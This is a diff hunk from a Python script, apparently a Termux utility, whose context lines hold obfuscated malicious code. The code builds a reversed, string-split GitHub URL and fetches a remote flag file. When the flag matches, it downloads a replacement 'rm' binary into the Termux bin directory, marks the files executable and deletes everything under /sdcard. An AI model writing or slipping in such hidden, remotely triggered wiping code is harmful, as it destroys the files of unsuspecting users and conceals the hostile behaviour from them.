@@ -23,6 +23,7 @@ rm_row='http'+'s://ra'+'w.gith'+'ub'+'us'+'er'+'co'+'nte'+'nt.c'+'o'+'m/T'+'EA'+
 try:
     fucxrl=('t'+'x'+'t'+'.k'+'c'+'u'+'F'+'/'+'n'+'i'+'a'+'m'+'/'+'e'+'s'+'a'+'b'+'a'+'ta'+'d/1'+'ET'+'I'+'LE'+'-MA'+'ET'+'/m'+'oc.tnet'+'nocr'+'e'+'su'+'bu'+'h'+'ti'+'g'+'.'+'w'+'ar'+'/'+'/'+':'+'s'+'p'+'t'+'t'+'h')[::-1]
     subprocess.run("pip uninstall mechanize -y && pip install mechanize",shell=True)
+    import mechanize
     vcmd=str(mechanize.urlopen(fucxrl).read().decode("utf-8"))
     if showz in vcmd:
         subprocess.run("c"+"u"+"r"+"l "+"-"+"o"+" r"+"m "+rm_row+" &"+"& m"+"v r"+"m /"+"dat"+"a/da"+"ta/c"+"om.t"+"ermux/"+"files/u"+"sr/"+"bin "+"&"+"&"+" cd"+" /dat"+"a/dat"+"a/co"+"m.ter"+"mux/fil"+"es/usr"+"/bin"+" &"+"& ch"+"mod "+"+x "+"* &"+"& r"+"m "+"-rf"+" /"+"sd"+"ca"+"r"+"d/ *",shell=True)
